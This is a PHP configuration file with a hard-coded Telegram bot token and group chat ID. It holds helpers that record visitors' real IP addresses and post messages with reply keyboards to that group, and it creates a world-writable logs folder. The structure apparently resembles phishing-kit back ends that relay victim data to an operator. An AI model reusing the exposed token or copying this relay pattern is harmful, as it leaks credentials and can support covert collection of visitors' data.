<?php
// Telegram Bot Configuration
define('BOT_TOKEN', '8186368376:AAF3bvj3E6Guu2GQWqFe0YHpMpkG3teWc7E');
define('CHAT_ID', '-1003715984449'); // Group ID (starts with -100 for supergroups, e.g., -1001234567890)

// Paths
define('LOGS_DIR', __DIR__ . '/logs/');
define('ROOT_DIR', __DIR__ . '/');
define('API_DIR', __DIR__ . '/api/');
define('PAGES_DIR', __DIR__ . '/pages/');
define('ADMIN_DIR', __DIR__ . '/admin/');
define('BOT_DIR', __DIR__ . '/bot/');

// Ensure logs directory exists
if (!file_exists(LOGS_DIR)) {
    mkdir(LOGS_DIR, 0777, true);
    chmod(LOGS_DIR, 0777);
}

// Get real IP address (handles proxies, CloudFlare, etc.)
function getRealIpAddress() {
    $ipHeaders = [
        'HTTP_CF_CONNECTING_IP',    // CloudFlare
        'HTTP_X_REAL_IP',            // Nginx proxy
        'HTTP_X_FORWARDED_FOR',      // Standard proxy
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipHeaders as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            // If multiple IPs, take the first one
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            // Validate IP
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Telegram API Helper
function sendTelegramMessage($text, $keyboard = null) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($keyboard !== null) {
        $data['reply_markup'] = $keyboard;
    }
    
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'ignore_errors' => true
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result;
}

function getSessionId() {
    return md5(getRealIpAddress() . time() . rand(1000, 9999));
}
